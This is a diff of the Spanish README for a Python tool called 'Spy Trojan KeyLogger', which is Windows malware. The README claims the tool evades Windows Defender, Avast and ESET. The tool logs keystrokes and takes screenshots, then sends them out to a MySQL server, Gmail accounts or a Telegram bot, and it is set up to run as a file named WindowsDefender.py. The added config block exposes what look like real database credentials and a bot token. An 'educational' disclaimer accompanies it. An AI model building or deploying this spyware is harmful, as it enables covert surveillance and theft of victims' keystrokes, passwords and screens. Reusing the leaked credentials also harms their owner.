@@ -1,21 +1,18 @@
 ````
 █▀ █▀█ █▄█   ▀█▀ █▀█ █▀█   █ ▄▀█ █▄ █   █▄▀ █▀▀ █▄█ █   █▀█ █▀▀ █▀▀ █▀▀ █▀█
-▄█ █▀▀  █     █  █▀▄ █▄█ █▄█ █▀█ █ ▀█   █ █ ██▄  █  █▄▄ █▄█ █▄█ █▄█ ██▄ █▀▄ v5.3    
+▄█ █▀▀  █     █  █▀▄ █▄█ █▄█ █▀█ █ ▀█   █ █ ██▄  █  █▄▄ █▄█ █▄█ █▄█ ██▄ █▀▄ v5.3.1    
 ````
 
-# NOTA: Quizas la documentación no tenga un poco de coherencia, aún falta culminar de escribir la Documentación para la versión 5.3
-
 ---
-# ¡Por favor! úserla solo para fines educativos y con profesionalidad...
+# __¡ Nota importante !:__ Ésta herramienta tiene como único proposito general, el aprendizaje de ___"Seguridad en sistemas informáticos"___, el creador no se hace responsable por un posible mal uso de ésta herramienta. 
+
 ## Información
 * __Nombre:__ `Spy Trojan KeyLogger`
-* __Documentación:__ `02/07/2020` 
-* __Versión:__ `5.3`
+* __Documentación:__ `09/07/2020` 
+* __Versión:__ `5.3.1`
 * __Estado:__` Estable`
 * __Plataforma:__` Windows 7, 8.1 y 10`
 * __Lenguaje:__` Python 3.8`
-
-__¡ Nota importante !:__ Ésta herramienta tiene como único proposito general, el aprendizaje de ___"Seguridad en sistemas informáticos"___, el creador no se hace responsable por un posible mal uso de ésta herramienta. 
 
 
 # Carpeta Principal
@@ -23,7 +20,7 @@ __¡ Nota importante !:__ Ésta herramienta tiene como único proposito general,
 
 ---
 # Caracteristicas
-- __Indetectable Antivirus:__ Solo para: Windows Defender `02/07/2020`, Avast, ESET NOD32
+- __Indetectable Antivirus:__ Testeado en: Windows Defender `09/07/2020`, Avast, ESET NOD32
 - __Envío por DB_MYSQL:__ Envio de de datos mediante una base de datos MySQL, más información [Aquí](https://github.com/SebastianEPH/SpyTrojan_Keylogger#env%C3%ADo-mediante-base-de-datos-mysql)
 
     ![DataBase key](https://i.imgur.com/axhHVlF.png)
@@ -61,7 +58,7 @@ __¡ Nota importante !:__ Ésta herramienta tiene como único proposito general,
 
 
 - __Envio mediante Bot Telegram:__ Soporte de envio automatico del registro de teclas a un bot especifico. Nota: puedes enviar el registro de teclas simultaneamente a 3 cuentas distintas
-- __Screenshot:__ Toma capturas de pantalla con un intervalo personalizado [Solo valido para Telegram] [hasta 3 cuentas]
+- __Screenshot:__ Toma capturas de pantalla con un intervalo personalizado [Solo valido para Telegram] [hasta 3 cuentas simultaneas]
 
     ![](https://i.imgur.com/NpNzd4b.png)
 
@@ -107,18 +104,58 @@ import string                   # Lib genera textos
 import time                     # Contar segundos
 from PIL import ImageGrab       # Toma capturas de pantalla
 ````
+## Explicación:
+En este ejemplo solo se mostrará las constantes que deben cambiar:
 
+````py
+class Config:
+    def __init__(self):
+        self.TIME_SCREENSHOT = 30 #[seconds]                    # Tiempo de intervalo de ScreenShot
+        self.DELAY  = 1                                         # tiempo de retraso para evitar sobrecargos al iniciar
+        self.TIME_SEND = 1 #[minutos]                           # Tiempo de envió del registro
+        self.MODE_SEND = 2      # 0 = Gmail
+                                # 1 = DataBase                  # Solo se puede usar una opción
+                                # 2 = TelegramBot
+    class DataBase:  # Clase de Base de datos
+        def __init__(self):
+            self.HOSTNAME = "bh1g5gnxzw2igrvui8hq-mysql.services.clever-cloud.com"  # HostName
+            self.USERNAME = "udwlsyrbtldkznqo"                                      # Username
+            self.PASSWORD = "OR2i2dfdgWek0UDiAv4f"                                  # Password
+            self.DATABASE = "bh1g5gnxzw2igrvui8hq"                                  # DataBase Name
+            self.PORT     = "3306"                                                  # Port
+    class Gmail:
+        def __init__(self):
+            self.GMAIL_1 = "correo1@gmail.com"
+            self.PASS_1  = "password1"
+            self.GMAIL_2 = "correo2@gmail.com"
+            self.PASS_2  = "password2"
+            self.GMAIL_3 = "correo3@gmail.com"
+            self.PASS_3  = "password3"
+          # Solo un correo Recibirá el Registro de Teclas
+            self.RECEIVERS = ["receivers1@yahoo.com"]
+          # Correos que recibiran el Registro de teclas, pueden ser de 1 a muchos
+            self.RECEIVERS = ["receivers1@yahoo.com","receivers2@gmail.com","receivers3@hotmail.com"]
+    class TelegramBot:
+        def __init__(self):
+            self.ID   = 833456944                                                     # ID Principal [Obligatorio]
+            self.ID_2 = 000000000                                                     # ID secundario [Opcional]
+            self.ID_3 = 000000000                                                     # ID Terciario  [Opcional]
+            self.TOKEN = "1345614169:AAE7O_jRBhIkq_minXh52Ws2SV3wlPfp844"             # TOKEN de tu Bot [Obligatorio]
+            # Personalize
+            self.LEN_TEXT = 3000  #    [Longitud maxima por mensaje es de = 4000] # Solo se enviará el registro si sobrepasa la longitud especificada
+````
 
 ## ScreenShot [Solo Telegram]
-    ````py
-    self.SCREENSHOT = True                                  # Activar o desactivar Screenshot
-    self.TIME_SCREENSHOT = 2                                # Tiempo de intervalo de ScreenShot
-    self.DELAY  = 10                                                            # tiempo de retraso para evitar sobrecargos al iniciar
-    self.TIME_SEND = 1 #[minutos]                                               # Tiempo de envió del registro
-    self.MODE_SEND = 2     # 0 = Gmail
-                           # 1 = DataBase                                           # Solo se puede usar una opción
-                           # 2 = TelegramBot
-    ````
+
+````py
+self.SCREENSHOT = True                                  # Activar o desactivar Screenshot
+self.TIME_SCREENSHOT = 30 #[seconds]                    # Tiempo de intervalo de ScreenShot
+self.DELAY  = 1                                         # tiempo de retraso para evitar sobrecargos al iniciar
+self.TIME_SEND = 1 #[minutos]                           # Tiempo de envió del registro
+self.MODE_SEND = 2      # 0 = Gmail
+                        # 1 = DataBase                  # Solo se puede usar una opción
+                        # 2 = TelegramBot
+````
 
 ## Escoge [GMAIL], [DataBase] o [Telegram]:
 - Por ahora solo podemos escoger el envío del registro o bien por una conexión a una __Base de datos__,  __Gmail__  o __BotTelegram__ no podemos escoger dos o las tres al mismo tiempo.
@@ -202,7 +239,7 @@ from PIL import ImageGrab       # Toma capturas de pantalla
 10. Ahora entramos a nuestro archivo `WindowsDefender.py` y buscamos y colocamos los datos de tu base de datos:
 
     ````py
-         # Importante
+        # Importante
         self.TIMESEND = 26 #[minutos]                                                # Tiempo de envió del registro
         self.MODE = 1     # 0 = Gmail
                           # 1 = DataBase                                            # Solo se puede usar una opción
@@ -331,5 +368,5 @@ __Nota:__ Contacteme solo si encontró un bug o desea aportar al repositorio, gr
 
 - [Website](https://sebastianeph.github.io/)
 - [Github](https://github.com/SebastianEPH)
-<!--- - [Telegram](https://t.me/sebastianeph) -->
 - [Facebook](https://www.facebook.com/SebastianEPH)
+<!--- - [Telegram](https://t.me/sebastianeph) -->
